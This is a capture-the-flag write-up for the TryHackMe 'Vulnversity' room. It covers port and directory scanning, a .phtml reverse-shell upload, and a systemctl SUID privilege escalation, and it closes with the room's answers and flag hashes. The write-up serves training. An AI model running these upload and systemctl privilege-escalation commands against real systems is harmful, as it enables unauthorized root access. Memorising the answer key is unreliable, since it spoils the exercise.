# THM - Vulnversity
**recon - privesc - webappsec - video**

## Enumeration
IP Address : 10.10.169.247
### 1.1 
#### nmap
**nmap -A 10.10.169.247**
./nmap file
=> 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
### 1.2 
#### gobuster
**gobuster dir -u http://10.10.169.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
**gobuster dir -u http://10.10.169.247:3333/internal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
/uploads
### 1.2 
#### nikto
**nikto -h http://10.10.169.247:3333** 
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)

### Conclusion, vulnerabilities
In /internal it's possible to upload files. It's maby a revshell possibility with activation in /uploads.
## Exploit
### 1.1
#### Reverse shell
Name file reverse.phtml and upload, clic in /uploads and it's a reverse shell !
**python -c 'import pty; pty.spawn("/bin/bash")'** for stabilize shell.
In /home/bill => bill.txt

### Conclusion
It was possible to inject revshell.

## Privilege escalation
### 1.1
#### sudo
**find / -perm -4000 -print 2>&1**
Search for /bin/systemctl and find a possible vulnerability : 
**cd /bin**
**sh**
TF=$(mktemp).service
echo '[Service]
Type=oneshot**
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF**
**cat /tmp/output**
### Conclusion
With suid permission, it was possible to open an bash with root id
## Responses
### Scan the box, how many ports are open? : 
**6**
### What version of the squid proxy is running on the machine? : 
**3.5.12**
### How many ports will nmap scan if the flag -p-400 was used? : 
**400**
### Using the nmap flag -n what will it not resolve? : 
**DNS**
### What is the most likely operating system this machine is running? : 
**Ubuntu**
### What port is the web server running on? : 
**3333**
### What is the directory that has an upload form page? : 
**/internal/**
### Run this attack, what extension is allowed? : 
**.phtml**
### What is the name of the user who manages the webserver? : 
**bill**
### What is the user flag? : 
**8bd7992fbe8a6ad22a63361004cfcedb**
### On the system, search for all SUID files. What file stands out? : 
**/bin/systemctl**
### Become root and get the last flag (/root/root.txt) : 
**a58ff8579f0a9270368d33a9966c7fd5**
